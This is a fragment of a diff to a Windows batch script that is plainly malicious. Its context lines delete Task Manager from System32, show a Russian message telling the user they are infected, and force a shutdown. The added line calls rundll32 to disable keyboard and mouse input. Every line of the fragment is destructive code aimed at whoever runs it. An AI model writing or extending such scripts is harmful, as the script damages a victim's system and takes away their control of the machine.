@@ -96,6 +96,8 @@ Del C:\Windows\System32\taskmgr.exe /q
 
 msg * ТЫ ЗАРАЖЕН ТАСК МЕНЕДЖЕР УДАЛЕН ЖДИ 60 СЕКУЕТ СЕКУНД
 
+rundll32 user,disableoemlayer
+
 timeout 60 /nobreak
  
 Shutdown.exe /s /t 120
